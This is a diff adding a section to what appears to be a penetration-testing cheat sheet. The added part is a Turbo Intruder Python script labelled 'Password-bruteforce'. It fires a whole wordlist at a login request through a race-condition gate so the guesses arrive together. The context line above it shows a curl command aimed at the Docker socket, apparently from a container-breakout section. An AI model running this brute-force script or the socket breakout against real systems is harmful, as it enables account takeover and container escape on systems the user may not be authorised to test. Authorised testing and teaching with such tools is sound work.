@@ -1572,9 +1572,34 @@ curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/09
 
 - [Owasp-Vitcc](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158)
 
+-------------
+
+### RACE CONDITION CODE SNIPPETS [Turbo Intruder]
+
+-------------
+
+- Password-bruteforce-:
+
+```python3
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    for word in open("C:\Users\HP\Documents\wordlist.txt"):
+        engine.queue(target.req, word.rstrip(), gate='race1')
+    engine.openGate('race1')
 
 
+def handleResponse(req, interesting):
+    table.add(req)
+```
 
+--------------
+
+- [Hackingarticles](https://www.hackingarticles.in/burp-suite-for-pentester-turbo-intruder/)
+
+--------------
 
 
 
